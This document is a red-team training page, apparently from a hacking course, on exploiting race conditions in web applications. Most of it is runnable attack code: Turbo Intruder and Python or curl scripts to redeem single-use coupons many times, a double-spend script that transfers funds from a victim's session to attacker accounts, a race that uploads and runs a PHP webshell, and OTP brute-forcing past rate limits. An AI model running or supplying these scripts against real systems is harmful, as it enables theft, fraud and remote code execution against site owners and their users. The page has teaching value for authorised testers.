---
layout: training-page
title: "Race Conditions — Web Attack — Red Team Academy"
module: "Web Hacking"
tags:
  - race-conditions
  - toctou
  - concurrency
  - web-attacks
  - burp-suite
page_key: "web-race-conditions"
render_with_liquid: false
---

# Race Conditions

Race conditions occur when the outcome of an operation depends on the timing or ordering of concurrent requests. Web applications that perform check-then-act operations without atomic transactions or locking are vulnerable. Modern research (PortSwigger 2023) expanded the attack surface beyond classic TOCTOU — race conditions can now be used to bypass rate limits, exploit single-use tokens, and trigger hidden state in multi-step workflows.

## Core Concepts

```
# Time-of-Check to Time-of-Use (TOCTOU) — classic pattern:
# Normal flow:
#   1. Check: Is user balance >= $100?
#   2. Use:   Deduct $100 from balance
#
# Attack — send 10 parallel requests:
#   1. All 10 check: balance = $200, $200 >= $100 ✓
#   2. All 10 deduct: balance goes negative
#   Result: bought $1000 of goods with $200 balance

# Vulnerable operation types:
# - Balance/inventory checks before deduction
# - Single-use token validation (coupon codes, gift cards, 2FA)
# - Rate limiting (bypass by racing the counter reset)
# - File processing (access before validation completes)
# - Account creation (duplicate accounts from parallel requests)
# - Vote/like systems (bypass per-user limit)
# - OAuth state token reuse
```

## Technique 1: Single-Packet Attack (Most Effective)

HTTP/1.1 last-byte sync and HTTP/2 single-packet attack minimize network jitter by sending all requests simultaneously, maximizing the chance of hitting the race window.

```
# HTTP/2 single-packet attack in Turbo Intruder (Burp extension):
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    # Queue all requests
    for i in range(20):
        engine.queue(target.req, gate='race1')
    # Release all at once — same TCP packet
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)

# HTTP/1.1 last-byte synchronization:
# 1. Send requests with all bytes except the final byte
# 2. Server holds connections open waiting for completion
# 3. Send final bytes for all connections simultaneously
# Turbo Intruder handles this automatically with gate=

# Burp Suite native (2023+):
# Repeater → Group requests → Send group in parallel
# HTTP/2 → single-packet mode (most reliable)
```

## Technique 2: Parallel Requests

```
# Python async — maximum parallelism:
import asyncio, aiohttp

async def send_request(session, url, data, headers):
    async with session.post(url, data=data, headers=headers) as resp:
        return await resp.text()

async def race(url, data, headers, count=50):
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data, headers) for _ in range(count)]
        responses = await asyncio.gather(*tasks)
    success = sum(1 for r in responses if "success" in r.lower())
    print(f"[+] {success}/{count} succeeded")
    return responses

asyncio.run(race(
    "https://target.com/api/redeem",
    {"code": "DISCOUNT50"},
    {"Cookie": "session=abc123", "Content-Type": "application/json"},
    count=50
))

# curl with GNU parallel:
seq 1 50 | parallel -j 50 \
  "curl -s -X POST 'https://target.com/redeem' -H 'Cookie: session=abc123' -d 'code=SINGLE-USE'"

# bash backgrounding (less precise, useful for quick tests):
for i in {1..30}; do
  curl -s -X POST "https://target.com/redeem" \
    -H "Cookie: session=abc123" -d "code=PROMO" &
done
wait
```

## Attack Scenarios

### Coupon / Gift Card Abuse

```
# Single-use coupon that can be redeemed multiple times via race:
# 1. Add item to cart
# 2. Send 20 simultaneous POST /apply-coupon requests

# Turbo Intruder script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=20,
                          requestsPerConnection=1)
    for i in range(20):
        engine.queue(target.req, gate='race')
    engine.openGate('race')

# Check for inconsistent responses — multiple 200s = vulnerable
```

### Double-Spend / Money Transfer

```
# Transfer same funds to multiple attacker accounts simultaneously:
import threading, requests

def transfer(to_account, session):
    requests.post("https://bank.com/transfer",
                  data={"to": to_account, "amount": 500},
                  cookies={"session": session})

threads = [threading.Thread(target=transfer, args=(acct, "VICTIM_SESSION"))
           for acct in ["attacker1", "attacker2", "attacker3"]]

# Start all simultaneously
for t in threads: t.start()
for t in threads: t.join()
```

### Rate Limit Bypass

```
# If rate limiting uses "check count, increment counter" without atomic lock:
# Send N requests before any counter increments
for i in {1..100}; do
  curl -s "https://target.com/api/verify?otp=123456" &
done
wait

# Common scenario: brute-force OTP within rate limit window
# Application checks: "has user made > 5 attempts?"
# If check and increment are non-atomic, all 100 requests see count=0
```

### File Upload Race

```
# Race: upload PHP webshell, access it before validation deletes it
import threading, requests, time

TARGET = "https://target.com"
WEBSHELL = ""

def upload():
    requests.post(f"{TARGET}/upload",
                  files={"file": ("shell.php", WEBSHELL)},
                  cookies={"session": "SESSION_TOKEN"})

def access():
    for _ in range(200):
        r = requests.get(f"{TARGET}/uploads/shell.php?cmd=id")
        if "uid=" in r.text:
            print(f"[!] RCE: {r.text}")
            return
        time.sleep(0.01)

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start(); t2.start()
t1.join(); t2.join()
```

### OAuth State Token Reuse

```
# Some apps only invalidate OAuth state tokens after the first use
# Race multiple parallel callbacks with the same state token:
# → Multiple accounts linked, or state validation bypassed

# GET /oauth/callback?code=AUTH_CODE&state=STATE_TOKEN
# Send this request 5 times in parallel — if state is only marked used once,
# subsequent requests may succeed with the same code/state
```

## Advanced: Partial Construction Race

```
# New class of race (PortSwigger 2023 research):
# Multi-endpoint state: a resource exists in a partially-constructed state
# between two endpoint calls

# Example: password reset flow
# 1. POST /forgot-password → creates reset token, sends email
# 2. POST /reset-password  → validates token, changes password

# Race: submit /reset-password while /forgot-password is still processing
# → token may validate before email binding is complete
# → allows token reuse or auth bypass during construction window

# Session creation race:
# Register two accounts with same username simultaneously
# → duplicate session tokens may be assigned
```

## Tooling

```
# Turbo Intruder (Burp extension — best tool):
# Install: BApp Store → Turbo Intruder
# Right-click request → Extensions → Turbo Intruder
# Use race-single-packet-attack.py template

# race-the-web:
git clone https://github.com/TheHackerDev/race-the-web
# Configure config.toml:
# [[targets]]
# method = "POST"
# url = "https://target.com/api/transfer"
# body = '{"amount":100,"to":"attacker"}'
# cookies = "session=abc123"
# count = 100
race-the-web config.toml

# HTTP/2 async Python (httpx):
import httpx, asyncio
async def h2_race():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [client.post("https://target.com/api/action",
                             cookies={"session": "TOKEN"}) for _ in range(20)]
        return await asyncio.gather(*tasks)

asyncio.run(h2_race())
```

## Detection Indicators

```
# Signs of a vulnerable application:
# - Balance or inventory can go negative
# - Single-use codes redeemed multiple times
# - Multiple identical responses to parallel requests for unique resource
# - No database transactions (BEGIN/COMMIT) around check + update operations
# - Missing row-level locking (SELECT FOR UPDATE)

# Signs during testing:
# - Inconsistent 200/400 responses in parallel batch
# - Response times vary significantly (lock contention)
# - Application-level errors after race (foreign key violations, etc.)

# Testing approach:
# 1. Identify operations with TOCTOU potential
# 2. Send 20-50 parallel requests with Turbo Intruder / single-packet mode
# 3. Look for success responses beyond what should be allowed
# 4. Check for duplicate entries in your account/activity history
```

## Race Condition Attack Patterns

Attack pattern taxonomy and real-world examples from PayloadsAllTheThings.

### Limit-Overrun Pattern

```
# Classic limit-overrun — exceed resource constraints via parallel requests:
# Targets: balance checks, inventory, coupon redemption, vote/like limits

# Real-world examples (from HackerOne):
# - Race condition allows redeeming gift cards multiple times (h1 report 759247)
# - Race conditions bypass invitation limits (h1 report 115007)
# - Register multiple users from a single invitation (h1 report 148609)

# Test pattern:
# 1. Identify an operation with a numeric limit (apply coupon, use gift card)
# 2. Queue 20-50 identical requests with Turbo Intruder
# 3. Release all simultaneously via openGate
# 4. Look for multiple 200 OK responses when only 1 should succeed
```

### Rate-Limit Bypass Pattern

```
# Rate limiting uses check-then-increment without atomicity:
# "Has this user made > N requests?"  ← check
# counter += 1                         ← separate operation (not atomic)

# Attack: send N+1 parallel requests before any increment is registered
# All requests see count=0 at check time

# Real-world: Instagram password reset — race to brute-force OTP
# (Laxman Muthiyah, youtu.be/4O9FjTMlHUM)

# Turbo Intruder for rate limit bypass:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=30,
                          pipeline=False)
    for i in range(30):
        engine.queue(target.req, i)
    engine.openGate('race1')
    engine.start(timeout=5)
```

## Single-Packet Attack

HTTP/2 single-packet attack technique from PayloadsAllTheThings — the most reliable race condition technique.

### HTTP/1.1 Last-Byte Synchronization

```
# Send all but the last byte of each request, hold connections open
# Then release the final byte of all connections simultaneously
# Eliminates network jitter — all requests arrive in the same TCP window

# Turbo Intruder last-byte sync:
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')   # releases final byte for all queued requests
```

### HTTP/2 Single-Packet Attack (Most Reliable)

```
# HTTP/2 allows multiple requests over a single TCP connection
# Single-packet: ~20-30 requests sent in ONE TCP packet
# Network jitter = zero — perfect for tight race windows

# Burp Suite native (2023+):
# 1. Send request to Repeater
# 2. Ctrl+R 19 more times (20 total)
# 3. Create a new tab group → add all 20 requests
# 4. Send group in parallel (single-packet attack)
# 5. HTTP/2 must be enabled for the target

# h2spacex — low-level HTTP/2 single-packet via Scapy:
pip install h2spacex
# github.com/nxenon/h2spacex

# Raceocat — higher-level race condition tool:
# github.com/JavanXD/Raceocat

# CVE-2022-4037: Race condition in GitLab discovered using single-packet attack
# (youtu.be/Y0NVIVucQNE)
```

### Turbo Intruder Full Example

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)

# For wordlist-based attacks (OTP brute force via race):
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=30,
                          pipeline=False)
    for word in open('/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt'):
        engine.queue(target.req, word.rstrip(), gate='otp')
    engine.openGate('otp')
```

## Resources

- PortSwigger research — Smashing the State Machine — `portswigger.net/research/smashing-the-state-machine`
- PortSwigger race condition labs — `portswigger.net/web-security/race-conditions`
- Turbo Intruder — `github.com/PortSwigger/turbo-intruder`
- race-the-web — `github.com/TheHackerDev/race-the-web`
- MITRE ATT&CK T1499.004 — Application or System Exploitation — `attack.mitre.org/techniques/T1499/004/`
